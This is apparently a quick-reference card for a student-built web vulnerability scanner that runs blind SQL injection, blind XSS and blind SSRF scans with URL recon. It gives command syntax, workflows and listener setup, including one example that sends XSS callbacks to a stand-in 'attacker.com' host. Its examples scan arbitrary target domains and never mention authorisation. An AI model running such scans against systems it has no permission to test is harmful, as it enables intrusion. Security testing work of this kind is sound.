# QUICK REFERENCE CARD

## Command Syntax

```
python main.py [INPUT] [RECON] [SCAN] [SCAN-OPTIONS]
```

---

## INPUT OPTIONS (Choose One)

| Option | Format | Example |
|--------|--------|---------|
| `-u URL` | Full URL with parameters | `-u 'https://example.com/search?q=test'` |
| `-u DOMAIN` | Base domain | `-u example.com` |
| `-f FILE` | File with URLs/domains | `-f targets.txt` |
| `--raw FILE` | Raw HTTP request | `--raw request.txt` |

---

## RECON OPTIONS (Optional)

| Option | Effect |
|--------|--------|
| (none) | Skip recon, use direct targets |
| `--recon` | Enable recon |
| `--recon-mode passive` | GAU + GF filtering (default) |
| `--recon-mode active` | Passive + blind recon |
| `--recon-mode both` | Alias for active |

---

## SCAN OPTIONS (Choose One)

| Option | Type |
|--------|------|
| `--scan sqli` | Blind SQL Injection |
| `--scan bxss` | Blind XSS (requires `--listener`) |
| `--scan ssrf` | Blind SSRF (requires `--listener`) |

---

## ADDITIONAL OPTIONS

| Option | Argument | Default |
|--------|----------|---------|
| `--threads` | N (int) | 5 |
| `--listener` | URL | (required for BXSS/SSRF) |
| `--wait` | Seconds | 30 |

---

## QUICK EXAMPLES

### SQLi - Direct Scan (Full URL)
```bash
python main.py -u 'https://site.com/page?id=1' --scan sqli
```

### SQLi - With Recon (Base Domain)
```bash
python main.py -u site.com --recon --recon-mode passive --scan sqli
```

### SQLi - From File (No Recon)
```bash
python main.py -f urls.txt --scan sqli
```

### BXSS - With Active Recon
```bash
python main.py -u site.com --recon --recon-mode active --scan bxss \
  --listener https://abc.ngrok.io
```

### SSRF - Direct Targets
```bash
python main.py -f ssrf_urls.txt --scan ssrf \
  --listener http://localhost:5000
```

### Raw Request
```bash
python main.py --raw request.txt --scan sqli
```

---

## ERROR MESSAGES & SOLUTIONS

### Error: "Base domain provided without --recon"

**Cause:** Using domain name without discovery flag

**Solution:**
```bash
# Option A: Use full URL
python main.py -u 'https://example.com/path?q=test' --scan sqli

# Option B: Enable recon
python main.py -u example.com --recon --scan sqli
```

### Error: "BXSS scan requires --listener URL"

**Cause:** Missing callback server for BXSS/SSRF

**Solution:**
```bash
# With ngrok
python main.py -f targets.txt --scan bxss --listener https://abc123.ngrok.io

# With your server
python main.py -f targets.txt --scan bxss --listener http://attacker.com:8080
```

### Error: "No parameterized URLs found"

**Cause:** Recon discovered no targets

**Solution:**
- Check domain name is correct
- Verify internet connectivity
- Try explicit URL instead of domain
- Check if gau tool is installed

---

## DECISION FLOWCHART

```
What do I have?
│
├─ Full URL (with ?param=value)
│  └─ Want to scan directly?
│     ├─ YES → main.py -u 'URL' --scan TYPE
│     └─ NO  → main.py -u 'URL' --recon --scan TYPE
│
├─ Domain name (example.com)
│  └─ Must use --recon
│     └─ main.py -u domain --recon [--recon-mode passive] --scan TYPE
│
├─ File of URLs
│  └─ Want to filter with recon?
│     ├─ YES → main.py -f file --recon --scan TYPE
│     └─ NO  → main.py -f file --scan TYPE
│
└─ Raw HTTP request
   └─ main.py --raw file --scan sqli
```

---

## RECON MODES EXPLAINED

### Passive (Default)
```bash
--recon --recon-mode passive
```
- Uses Google Alert URLs (gau)
- Filters with GF patterns
- Scores parameters by risk
- ⏱️ Fast
- 🛡️ Non-destructive

### Active
```bash
--recon --recon-mode active
```
- Runs passive recon first
- Then blind reconnaissance probing
- More comprehensive
- ⏱️ Slower
- 🎯 More thorough

---

## LOGGING INDICATORS

### Recon Enabled
```
[INFO] [RECON] Enabled with mode: passive | URLs discovered: 45
```

### Recon Disabled
```
[INFO] [*] Recon disabled | Target URLs: 5
```

### Scan Starting
```
[INFO] Starting BXSS scan with 10 threads...
```

### Finding Found
```
[SUCCESS] Found 3 SQLi vulnerabilities
```

---

## COMMON WORKFLOWS

### Workflow 1: Quick Single-URL Test
```bash
python main.py -u 'https://target.com/search?q=test' --scan sqli
```

### Workflow 2: Full Domain Assessment
```bash
python main.py -u target.com --recon --recon-mode passive --scan sqli
python main.py -u target.com --recon --recon-mode passive --scan bxss --listener NGROK_URL
python main.py -u target.com --recon --recon-mode passive --scan ssrf --listener LISTENER_URL
```

### Workflow 3: Bulk Testing
```bash
python main.py -f targets.txt --scan sqli --threads 20
python main.py -f targets.txt --scan bxss --listener NGROK_URL --threads 10
```

### Workflow 4: Raw Request Testing
```bash
python main.py --raw burp_export.txt --scan sqli
```

---

## THREAD RECOMMENDATIONS

| Scan Type | Threads | Notes |
|-----------|---------|-------|
| SQLi | 10-20 | Fast, low resource |
| BXSS | 5-10 | Needs callback server |
| SSRF | 5-10 | Needs callback server |
| Recon | Default | Handled internally |

---

## HELP & VERSION

### Full Help
```bash
python main.py --help
```

### Check Syntax
```bash
python -m py_compile main.py
```

### List Options
```bash
python main.py --help | grep "^  -"
```

---

## LISTENER SETUP

### ngrok (Recommended for Testing)
```bash
# Terminal 1: Start ngrok
ngrok http 5000

# Terminal 2: Run scanner
python main.py -u target.com --recon --scan bxss \
  --listener https://YOUR_NGROK_URL.ngrok.io
```

### Local Server
```bash
# Terminal 1: Start server
python -m http.server 8080

# Terminal 2: Run scanner
python main.py -u target.com --recon --scan bxss \
  --listener http://localhost:8080
```

### Interactsh
```bash
python main.py -u target.com --recon --scan bxss \
  --listener https://interactsh.com
```

---

## TROUBLESHOOTING

**Q: "gau command not found"**
A: Install tool: `go install -v github.com/lc/gau/v2/cmd/gau@latest`

**Q: "No URLs discovered"**
A: Domain may not have known URLs. Try manual URL.

**Q: "No callbacks received"**
A: BXSS finding may be stored XSS. Check logs.

**Q: "Scan is slow"**
A: Reduce `--threads` if network is unstable. Increase if CPU-bound.

---

## FILE LOCATIONS

```
main.py ..................... Main scanner
recon/ ...................... Reconnaissance modules
bsqli/ ...................... SQL Injection module
bxss/ ....................... XSS module
bssrf/ ...................... SSRF module
output/ ..................... Generated findings
requirements.txt ............ Dependencies
.gitignore .................. Git ignore rules
```

---

## DOCUMENTATION FILES

| File | Purpose |
|------|---------|
| README.md | Project overview |
| CONTROL_FLOW_RESTRUCTURING.md | Implementation details |
| TESTING_GUIDE.md | Verification procedures |
| THESIS_DEFENSE_SUMMARY.md | Defense presentation |
| README_UPDATES.md | New features guide |
| PROJECT_COMPLETION_REPORT.md | Completion status |
| **QUICK_REFERENCE.md** | **This file** |

---

**Last Updated:** January 20, 2026  
**Status:** Ready for Production
